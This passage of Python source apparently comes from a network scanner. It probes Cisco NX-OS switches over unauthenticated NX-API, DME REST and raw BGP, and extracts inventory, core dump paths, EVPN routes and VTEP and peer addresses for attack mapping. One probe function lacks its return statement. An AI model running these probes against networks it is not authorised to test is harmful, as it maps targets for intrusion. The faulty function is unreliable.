        # --- show environment temperature: temperature sensor readings ---------
        status, body = _nxapi_post(scheme, p, "show environment temperature")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_TEMP_SENSORS_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show environment temperature' returned HTTP 200 "
                    f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                    "Temperature sensor readings exposed -- per-module thermal values, "
                    "major/minor alarm thresholds, and current alarm states readable "
                    "without credentials. Temperature anomaly disclosure reveals cooling "
                    "failures and enables timing attacks against thermally stressed hardware."
                ),
                "host": host,
                "port": p,
            })

        # --- show module: line card and supervisor inventory -------------------
        # Ch. 3 Example 3-1: 'show module' lists every card in the chassis with
        # model, software/hardware version, status, and online diagnostic state.
        status, body = _nxapi_post(scheme, p, "show module")
        if status == 200 and len(body) > 10:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_MODULE_INVENTORY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show module' returned HTTP 200 unauthenticated "
                    f"on {scheme}://{host}:{p} ({len(body)} bytes). Module inventory "
                    "exposed -- per Ch. 3, output includes supervisor and line card types, "
                    "software/hardware versions, powered-down states, FEX card assignments, "
                    "and online diagnostic status.  Full chassis composition disclosed "
                    "without credentials."
                ),
                "host": host,
                "port": p,
            })
            # Parse Cisco serial number prefixes and module model strings
            serials = re.findall(
                r"\b(?:SAL|FDO|FOC|JAB|JAE|JAF|JSH)\w{5,12}\b", body
            )
            models = re.findall(
                r"\b(N[279]\d{3}\S{0,15}|N[567][kK]\S{3,15}|Nexus\s+\d{3,4}\S*)\b",
                body,
            )
            if serials or models:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_MODULE_SERIALS_DISCLOSED",
                    "detail": (
                        f"Module serial number(s) and model(s) disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: "
                        f"serials: {', '.join(serials[:6]) or 'n/a'}; "
                        f"models: {', '.join(models[:6]) or 'n/a'}. "
                        "Cisco serial numbers (SAL/FDO/FOC prefix) uniquely identify "
                        "hardware units and can be leveraged for supply-chain attacks, "
                        "warranty fraud, or replacement-hardware targeting."
                    ),
                    "host": host,
                    "port": p,
                })

        # --- show inventory: full hardware inventory with serial numbers -------
        # 'show inventory' enumerates every field-replaceable unit (FRU) with
        # NAME, DESCR, PID (product ID), VID (version ID), and SN (serial number).
        status, body = _nxapi_post(scheme, p, "show inventory")
        if status == 200 and len(body) > 10:
            inv_sns = re.findall(r"(?i)\bSN\s*:\s*(\S+)", body)
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_FULL_INVENTORY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show inventory' returned HTTP 200 unauthenticated "
                    f"on {scheme}://{host}:{p} ({len(body)} bytes). Full hardware FRU "
                    "inventory exposed"
                    + (
                        f" -- {len(inv_sns)} serial number(s): "
                        + ", ".join(inv_sns[:8])
                        + (f" (+ {len(inv_sns) - 8} more)" if len(inv_sns) > 8 else "")
                        if inv_sns else ""
                    )
                    + ". Every field-replaceable unit is listed with NAME, DESCR, PID, "
                    "VID, and SN -- a complete asset profile enabling supply-chain "
                    "attribution and hardware-level targeting without any authentication."
                ),
                "host": host,
                "port": p,
            })

        # --- show cores: core dump inventory -----------------------------------
        # Ch. 3 Example 3-6: 'show cores vdc-all' lists VDC, module, instance,
        # process name, PID, and timestamp for each core file.  Core dumps contain
        # full process memory at time of crash and are stored in core: or volatile:
        # file systems accessible via NX-OS file management commands.
        status, body = _nxapi_post(scheme, p, "show cores")
        if status == 200 and len(body) > 5:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_CORE_DUMPS_LISTED",
                "detail": (
                    f"NX-API POST /ins 'show cores' returned HTTP 200 unauthenticated "
                    f"on {scheme}://{host}:{p} ({len(body)} bytes). Core dump inventory "
                    "exposed -- per Ch. 3, core files are generated for hardware and "
                    "process crashes and contain full process memory at time of crash. "
                    "Core list discloses crash history: VDC, module, PID, process name, "
                    "and timestamp for each crash event."
                ),
                "host": host,
                "port": p,
            })
            # Parse core:// file-system paths (core://module/pid/instance)
            core_paths = re.findall(r"core://[\d/]+", body)
            if core_paths:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_CORE_DUMP_ACCESSIBLE",
                    "detail": (
                        f"Core dump file path(s) disclosed unauthenticated on "
                        f"{scheme}://{host}:{p}: {', '.join(core_paths[:5])}. "
                        "Core files at these paths contain full process memory snapshots "
                        "from hardware or software crashes -- accessible core dumps may "
                        "expose in-memory credentials, routing tables, OSPF/BGP keying "
                        "material, and process heap contents to an unauthenticated attacker "
                        "with NX-API or file-system access."
                    ),
                    "host": host,
                    "port": p,
                })

    return findings


def probe_nxos_bgp_evpn_control_plane(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco NX-OS BGP EVPN control-plane exposure for VXLAN overlay RE.

    BGP EVPN (RFC 7432) is the control plane for Cisco NX-OS VXLAN fabrics.
    The NX-API CLI interface (/ins endpoint) and the DME REST API (/api/mo/)
    expose the full EVPN BGP table, VTEP peer list, and VNI membership without
    authentication when access controls are misconfigured or absent.

    From "Building Data Centers with VXLAN BGP EVPN" (Cisco Press, 2017):
    Route type 2 (MAC/IP advertisement) carries MAC-to-IP bindings per VNI;
    Route type 5 (IP prefix) carries inter-subnet routing; NVE peers are VTEPs
    discovered via BGP EVPN Type-3 inclusive multicast routes; L3 VNIs identify
    tenant VRFs for symmetric IRB (bridge-route-route-bridge).  Unauthenticated
    exposure of these tables maps the full overlay topology, enumerates tenant
    VRFs, and provides all VTEP IPs needed for targeted VXLAN injection.

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for use_ssl, p in [(True, port), (False, 80)]:
        scheme = "https" if use_ssl else "http"
        base_url = f"{scheme}://{host}:{p}"

        def _nxapi_post(cmd: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            payload = json.dumps({
                "ins_api": {
                    "version": "1.0",
                    "type": "cli_show",
                    "chunk": "0",
                    "sid": "1",
                    "input": cmd,
                    "output_format": "json",
                }
            }).encode()
            req = urllib.request.Request(
                f"{_base}/ins",
                data=payload,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "ablation/1.0",
                },
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(131072)
            except urllib.error.HTTPError as e:
                return e.code, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        def _dme_get(path: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            url = f"{_base}{path}"
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Accept": "application/json", "User-Agent": "ablation/1.0"},
                )
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(65536)
            except (urllib.error.URLError, OSError):
                return None, b""

        # --- show bgp l2vpn evpn: full EVPN BGP table ---
        status, body = _nxapi_post("show bgp l2vpn evpn")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in ("evpn", "l2vpn", "bgp", "route distinguisher")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_BGP_EVPN_TABLE_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show bgp l2vpn evpn' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "Full BGP EVPN table exposed -- discloses Route type 2 MAC/IP "
                            "bindings, Route type 3 VTEP replication lists, and Route type 5 "
                            "IP prefix routes across all tenant VRFs. Per RFC 7432 and "
                            "Cisco VXLAN BGP EVPN Ch. 2, this table contains the complete "
                            "overlay topology mapping for the VXLAN fabric."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse Route Distinguishers (ASN:ID or IP:ID format)
                    rds = re.findall(r"\b(\d{1,10}:\d{1,10})\b", raw)
                    rds = list(dict.fromkeys(rds))[:20]
                    if rds:
                        findings.append({
                            "severity": "HIGH",
                            "title": "NXOS_EVPN_RDS_DISCLOSED",
                            "detail": (
                                f"Route Distinguishers extracted from BGP EVPN table on "
                                f"{scheme}://{host}:{p}: {', '.join(rds[:10])}. "
                                "RDs identify per-VRF per-router BGP table instances "
                                "(RFC 4364 type 0/1/2). Cisco auto-derives RDs as "
                                "LoopbackIP:VRF-ID -- disclosed RDs reveal loopback "
                                "addresses, AS numbers, and VRF numbering scheme."
                            ),
                            "host": host,
                            "port": p,
                        })
                    # Parse MAC routes (type-2: MAC address patterns in EVPN context)
                    mac_routes = re.findall(
                        r"[0-9a-fA-F]{4}\.[0-9a-fA-F]{4}\.[0-9a-fA-F]{4}", raw
                    )
                    mac_routes = list(dict.fromkeys(mac_routes))
                    if mac_routes:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_EVPN_MAC_ROUTES_EXPOSED",
                            "detail": (
                                f"BGP EVPN Route type 2 (MAC/IP advertisement) MAC addresses "
                                f"extracted unauthenticated from {scheme}://{host}:{p}: "
                                f"{', '.join(mac_routes[:8])} ({len(mac_routes)} total). "
                                "Type-2 routes carry endpoint MAC and IP bindings per L2VNI "
                                "(Ch. 2: /216 MAC-only, /272 MAC+IPv4, /368 MAC+IPv6). "
                                "Full host inventory of all VMs and bare-metal servers in "
                                "the VXLAN fabric is disclosed."
                            ),
                            "host": host,
                            "port": p,
                        })
                    # Parse prefix routes (type-5: IPv4/IPv6 CIDR prefixes)
                    prefix_routes = re.findall(
                        r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})\b", raw
                    )
                    prefix_routes = list(dict.fromkeys(prefix_routes))
                    if prefix_routes:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_EVPN_PREFIX_ROUTES_EXPOSED",
                            "detail": (
                                f"BGP EVPN Route type 5 (IP prefix) routes extracted "
                                f"unauthenticated from {scheme}://{host}:{p}: "
                                f"{', '.join(prefix_routes[:8])}. "
                                "Type-5 routes carry inter-subnet IP prefixes and external "
                                "redistributions per tenant VRF (Ch. 2: /224 for IPv4). "
                                "Full L3 routing topology of all overlay tenants exposed."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show bgp l2vpn evpn summary: BGP EVPN peer summary ---
        status, body = _nxapi_post("show bgp l2vpn evpn summary")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in ("neighbor", "established", "evpn", "peer")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_EVPN_PEERS_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show bgp l2vpn evpn summary' returned "
                            f"HTTP 200 unauthenticated on {scheme}://{host}:{p} "
                            f"({len(body)} bytes). BGP EVPN peer summary exposed -- "
                            "discloses neighbor IP addresses, AS numbers, session state, "
                            "and prefix counts for all EVPN peers. Peers are typically "
                            "route reflectors (spines) and all VTEP leaf neighbors."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse peer IPs from BGP summary output
                    peer_ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", raw)
                    peer_ips = [
                        ip for ip in list(dict.fromkeys(peer_ips))
                        if not ip.startswith(("0.", "127.", "255."))
                    ][:15]
                    if peer_ips:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_EVPN_PEER_IPS",
                            "detail": (
                                f"BGP EVPN peer IP addresses disclosed unauthenticated on "
                                f"{scheme}://{host}:{p}: {', '.join(peer_ips[:10])}. "
                                "These IPs identify all BGP EVPN route reflectors and "
                                "VTEP peers -- complete fabric node inventory enabling "
                                "targeted BGP OPEN/UPDATE injection into EVPN sessions."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show nve peers: NVE (VTEP) peer list ---
        status, body = _nxapi_post("show nve peers")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in ("peer-ip", "nve", "vtep", "up", "peer")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_NVE_PEERS_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show nve peers' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "NVE (Network Virtualization Edge) peer list exposed -- "
                            "discloses all VTEP IP addresses participating in the VXLAN "
                            "fabric overlay. Per Ch. 2, VTEP peers are discovered via "
                            "BGP EVPN Type-3 inclusive multicast routes; disclosure "
                            "enumerates the full set of VXLAN encapsulation endpoints."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse peer VTEP IPs from NVE peer output
                    vtep_ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", raw)
                    vtep_ips = [
                        ip for ip in list(dict.fromkeys(vtep_ips))
                        if not ip.startswith(("0.", "127.", "255."))
                    ][:20]
                    if vtep_ips:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_VTEP_IPS_DISCLOSED",
                            "detail": (
                                f"VTEP peer IP addresses extracted from NVE peer table "
                                f"unauthenticated on {scheme}://{host}:{p}: "
                                f"{', '.join(vtep_ips[:10])}. "
                                "These loopback addresses are VXLAN tunnel endpoints -- "
                                "with this list an attacker can inject spoofed VXLAN "
                                "packets (UDP/4789) into any tenant VNI from any of "
                                "these sources without authentication (VXLAN has no "
                                "built-in auth per RFC 7348)."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show nve vni: VNI membership table ---
        status, body = _nxapi_post("show nve vni")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in ("vni", "vlan", "vrf", "bd", "bridge-domain")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_VNI_LIST_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show nve vni' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "Full VNI membership table exposed -- discloses all active "
                            "L2 VNIs (bridge domains) and L3 VNIs (tenant VRFs) with "
                            "VLAN/BD mappings. Per Ch. 5, L3 VNIs identify tenant VRFs "
                            "for symmetric IRB inter-subnet routing."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse VNI values (5-8 digit numbers typical for VXLAN VNIs)
                    l2_vnis = re.findall(r'"vni"\s*:\s*"?(\d{4,8})"?', raw)
                    if not l2_vnis:
                        l2_vnis = re.findall(r'\b([1-9]\d{4,7})\b', raw)
                    l2_vnis = list(dict.fromkeys(l2_vnis))
                    if l2_vnis:
                        findings.append({
                            "severity": "HIGH",
                            "title": "NXOS_L2_VNI_MAPPING",
                            "detail": (
                                f"L2 VNI-to-bridge-domain mappings disclosed unauthenticated "
                                f"on {scheme}://{host}:{p}: VNIs "
                                f"{', '.join(l2_vnis[:10])}. "
                                "L2 VNIs carry Ethernet broadcast domains across VXLAN -- "
                                "disclosure maps tenant Layer 2 segment topology and "
                                "enables targeted VXLAN injection into specific VNIs."
                            ),
                            "host": host,
                            "port": p,
                        })
                    # Parse L3 VNIs associated with VRF names
                    vrf_names = re.findall(r'"vrf-?name"\s*:\s*"([^"]+)"', raw)
                    if not vrf_names:
                        vrf_names = re.findall(
                            r'\b((?:vrf|tenant|Tenant|VRF)[-_]\w+)\b', raw
                        )
                    if vrf_names:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_L3_VNI_VRF_MAPPING",
                            "detail": (
                                f"L3 VNI-to-VRF mappings disclosed unauthenticated on "
                                f"{scheme}://{host}:{p}: VRFs "
                                f"{', '.join(list(dict.fromkeys(vrf_names))[:8])}. "
                                "L3 VNIs identify tenant VRFs for symmetric IRB routing "
                                "(Ch. 3: bridge-route-route-bridge per L3VNI). Disclosed "
                                "VRF names and L3 VNI values allow injection of spoofed "
                                "BGP EVPN Type-5 routes to redirect inter-tenant traffic."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show vxlan: VXLAN NVE interface state ---
        status, body = _nxapi_post("show vxlan")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw_lower = json.dumps(data).lower()
                if any(kw in raw_lower for kw in (
                    "vxlan", "nve", "source-interface", "multicast-group"
                )):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_VXLAN_STATE_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show vxlan' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "VXLAN NVE interface state exposed -- discloses source VTEP "
                            "loopback IP, NVE interface name, associated VNIs, and "
                            "multicast group assignments used for BUM traffic flooding."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

        # --- DME REST: NVE endpoint state /api/mo/sys/eps.json ---
        status, body = _dme_get("/api/mo/sys/eps.json")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw_lower = json.dumps(data).lower()
                if "imdata" in data or any(
                    kw in raw_lower for kw in ("eps", "nve", "vtep", "epid", "epscheme")
                ):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_NVE_DME_UNAUTH",
                        "detail": (
                            f"DME REST GET /api/mo/sys/eps.json returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "NVE endpoint state exposed via NX-OS Data Model Engine -- "
                            "the eps MO (Endpoint Scheme) contains NVE source interface, "
                            "VTEP IP, active VNI list, and peer state for the VXLAN "
                            "overlay. DME access without an APIC-Cookie is a NX-OS "
                            "access-control misconfiguration exposing complete overlay state."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

    return findings


def probe_nxos_vxlan_multisite_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Detect Cisco NX-OS VXLAN multi-site and DCI exposure for overlay RE.

    Cisco NX-OS VXLAN multi-site (Ch. 9 of "Building Data Centers with VXLAN
    BGP EVPN", Cisco Press 2017) extends BGP EVPN across data center sites via
    Border Gateway (BGW) nodes connected by DCI links.  BGW nodes carry
    inter-site BGP EVPN sessions and terminate DCI VXLAN encapsulation.

    PIM neighbors and mroute tables are probed because VXLAN BUM traffic uses
    PIM ASM/BiDir multicast groups in the underlay (Ch. 7); PIM neighbor
    disclosure maps the full underlay routing topology across pods/sites.

    The BGP port 179 probe sends a minimal BGP OPEN (AS 65000) to confirm
    whether the target responds as a BGP speaker and to extract version/AS
    from the response header.

    Args:
        host: Target IP or hostname.
        port: HTTPS port (default 443); HTTP 80 also probed.
        timeout: Per-request timeout in seconds.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for use_ssl, p in [(True, port), (False, 80)]:
        scheme = "https" if use_ssl else "http"
        base_url = f"{scheme}://{host}:{p}"

        def _nxapi_post(cmd: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            payload = json.dumps({
                "ins_api": {
                    "version": "1.0",
                    "type": "cli_show",
                    "chunk": "0",
                    "sid": "1",
                    "input": cmd,
                    "output_format": "json",
                }
            }).encode()
            req = urllib.request.Request(
                f"{_base}/ins",
                data=payload,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "ablation/1.0",
                },
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(131072)
            except urllib.error.HTTPError as e:
                return e.code, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        # --- show nve multisite dci-links: inter-site DCI links ---
        status, body = _nxapi_post("show nve multisite dci-links")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in (
                    "multisite", "dci", "border-gw", "bgw", "dci-link"
                )):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_MULTISITE_DCI_LINKS",
                        "detail": (
                            f"NX-API POST /ins 'show nve multisite dci-links' returned "
                            f"HTTP 200 unauthenticated on {scheme}://{host}:{p} "
                            f"({len(body)} bytes). Multi-site DCI link table exposed -- "
                            "discloses DCI interface names, remote site reachability, "
                            "and Border Gateway (BGW) state. Per Ch. 9, BGW nodes bridge "
                            "VXLAN fabrics across sites and carry inter-site BGP EVPN "
                            "sessions over the DCI link."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse Border Gateway IP addresses from DCI link output
                    bgw_ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", raw)
                    bgw_ips = [
                        ip for ip in list(dict.fromkeys(bgw_ips))
                        if not ip.startswith(("0.", "127.", "255."))
                    ][:15]
                    if bgw_ips:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": "NXOS_MULTISITE_BGW_IPS",
                            "detail": (
                                f"Border Gateway (BGW) IP addresses extracted from DCI "
                                f"link table unauthenticated on {scheme}://{host}:{p}: "
                                f"{', '.join(bgw_ips[:10])}. BGW nodes carry inter-site "
                                "BGP EVPN control-plane sessions and terminate DCI VXLAN "
                                "encapsulation -- highest-value targets for cross-site "
                                "fabric compromise via BGP UPDATE injection."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show nve multisite fabric-links: inter-site fabric links ---
        status, body = _nxapi_post("show nve multisite fabric-links")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw_lower = json.dumps(data).lower()
                if any(kw in raw_lower for kw in (
                    "multisite", "fabric", "fabric-link", "interface", "up"
                )):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_MULTISITE_FABRIC_LINKS",
                        "detail": (
                            f"NX-API POST /ins 'show nve multisite fabric-links' returned "
                            f"HTTP 200 unauthenticated on {scheme}://{host}:{p} "
                            f"({len(body)} bytes). Inter-site fabric link state exposed -- "
                            "discloses underlay interfaces connecting BGW nodes to the "
                            "intra-site spine fabric. Enables enumeration of the multi-site "
                            "underlay topology and ECMP path structure between sites."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

        # --- show bgp l2vpn evpn vni-id all: per-VNI BGP state ---
        status, body = _nxapi_post("show bgp l2vpn evpn vni-id all")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw_lower = json.dumps(data).lower()
                if any(kw in raw_lower for kw in ("vni", "evpn", "route", "prefix")):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_VNI_BGP_STATE_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show bgp l2vpn evpn vni-id all' returned "
                            f"HTTP 200 unauthenticated on {scheme}://{host}:{p} "
                            f"({len(body)} bytes). Per-VNI BGP EVPN state exposed -- "
                            "discloses BGP route counts, peer states, and prefix "
                            "advertisement status for every active VNI. Provides complete "
                            "per-tenant overlay reachability state including inter-site "
                            "route distribution across the BGW DCI path."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

        # --- show ip pim neighbor: PIM neighbors for BUM flooding underlay ---
        status, body = _nxapi_post("show ip pim neighbor")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data)
                raw_lower = raw.lower()
                if any(kw in raw_lower for kw in (
                    "neighbor", "pim", "interface", "dr-addr", "dr-priority"
                )):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_PIM_NEIGHBORS_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show ip pim neighbor' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "PIM neighbor table exposed -- discloses all PIM-adjacent "
                            "underlay routers used for BUM traffic multicast replication. "
                            "Per Ch. 7, PIM ASM/BiDir builds shared multicast trees for "
                            "VNI-to-multicast-group mappings in the VXLAN underlay."
                        ),
                        "host": host,
                        "port": p,
                    })
                    # Parse PIM neighbor IP addresses
                    pim_ips = re.findall(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", raw)
                    pim_ips = [
                        ip for ip in list(dict.fromkeys(pim_ips))
                        if not ip.startswith(("0.", "127.", "255.", "224.", "239."))
                    ][:15]
                    if pim_ips:
                        findings.append({
                            "severity": "HIGH",
                            "title": "NXOS_PIM_NEIGHBOR_IPS",
                            "detail": (
                                f"PIM neighbor IP addresses extracted unauthenticated on "
                                f"{scheme}://{host}:{p}: {', '.join(pim_ips[:10])}. "
                                "These IPs identify all underlay PIM-speaking routers -- "
                                "disclosure maps the multicast topology used for VXLAN "
                                "BUM flooding, enabling targeted PIM neighbor spoofing "
                                "and multicast tree hijacking to redirect BUM traffic."
                            ),
                            "host": host,
                            "port": p,
                        })
            except (ValueError, KeyError):
                pass

        # --- show ip mroute: multicast routing table ---
        status, body = _nxapi_post("show ip mroute")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw_lower = json.dumps(data).lower()
                if any(kw in raw_lower for kw in (
                    "mroute", "group", "source", "rpf", "oif", "(*,"
                )):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_MROUTE_TABLE_UNAUTH",
                        "detail": (
                            f"NX-API POST /ins 'show ip mroute' returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "IP multicast routing table exposed -- discloses all active "
                            "(S,G) and (*,G) multicast group entries for VXLAN BUM traffic "
                            "replication. Multicast group-to-VNI mappings, Rendezvous "
                            "Point (RP) addresses, and RPF interfaces are disclosed, "
                            "enabling reconstruction of the BUM flooding topology and "
                            "identification of the PIM RP for multicast join attacks."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

    # --- BGP port 179 TCP probe (outside NX-API loop) ---
    # BGP OPEN message (RFC 4271): 16-byte marker + len(29) + type(1=OPEN) +
    # ver(4) + AS(65000=0xfde8) + hold(180=0x00b4) + BGP-ID(0) + optlen(0)
    bgp_port = 179
    bgp_open = b'\xff' * 16 + b'\x00\x1d\x01\x04\xfd\xe8\x00\xb4' + b'\x00\x00\x00\x00\x00'
    try:
        bgp_sock = socket.create_connection((host, bgp_port), timeout=timeout)
        findings.append({
            "severity": "HIGH",
            "title": "NXOS_BGP_PORT_OPEN",
            "detail": (
                f"TCP connect to {host}:{bgp_port} succeeded; BGP port accessible "
                "from an external source. In a VXLAN BGP EVPN multi-site fabric, "
                "BGP port 179 carries inter-site EVPN sessions between Border "
                "Gateway (BGW) nodes. External TCP reachability enables BGP OPEN "
                "injection targeting the EVPN address family (AFI 25/SAFI 70)."
            ),
            "host": host,
            "port": bgp_port,
        })
        bgp_sock.settimeout(timeout)
        try:
            bgp_sock.sendall(bgp_open)
            resp = bgp_sock.recv(512)
            if resp and len(resp) >= 19:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_BGP_OPEN_RESPONSIVE",
                    "detail": (
                        f"BGP OPEN sent to {host}:{bgp_port} received a "
                        f"{len(resp)}-byte response. The peer responded to the "
                        "BGP OPEN message -- confirms an active BGP speaker willing "
                        "to negotiate. In a multi-site VXLAN fabric, a responsive "
                        "BGW BGP port allows injection of fabricated BGP EVPN UPDATE "
                        "messages to redirect inter-site tenant traffic or blackhole "
                        "routes across the DCI link."
                    ),
                    "host": host,
                    "port": bgp_port,
                })
                # Parse BGP message type from response byte 18
                # (after 16-byte marker + 2-byte length field)
                msg_type = resp[18]
                type_names = {1: "OPEN", 2: "UPDATE", 3: "NOTIFICATION", 4: "KEEPALIVE"}
                type_str = type_names.get(msg_type, f"UNKNOWN({msg_type})")
                if msg_type == 1 and len(resp) > 21:
                    remote_ver = resp[19]
                    remote_as = (resp[20] << 8) | resp[21]
                    detail_str = (
                        f"BGP OPEN response from {host}:{bgp_port} -- "
                        f"message type: {type_str}, BGP version: {remote_ver}, "
                        f"remote AS: {remote_as}. Remote AS discloses the BGP "
                        "autonomous system of the BGW node, confirming network "
                        "topology and enabling targeted eBGP/iBGP session attacks."
                    )
                else:
                    detail_str = (
                        f"BGP response from {host}:{bgp_port} -- "
                        f"message type: {type_str} (type={msg_type}). "
                        "BGP speaker identity confirmed via protocol response."
                    )
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_BGP_VERSION_DISCLOSED",
                    "detail": detail_str,
                    "host": host,
                    "port": bgp_port,
                })
        except socket.timeout:
            pass
        except OSError:
            pass
        bgp_sock.close()
    except OSError:
        pass


def probe_nxos_vdc_isolation_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe VDC admin state, HA policy, interface membership, and resource limits via NX-API."""
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for use_ssl, p in [(True, port), (False, 80)]:
        scheme = "https" if use_ssl else "http"
        base_url = f"{scheme}://{host}:{p}"

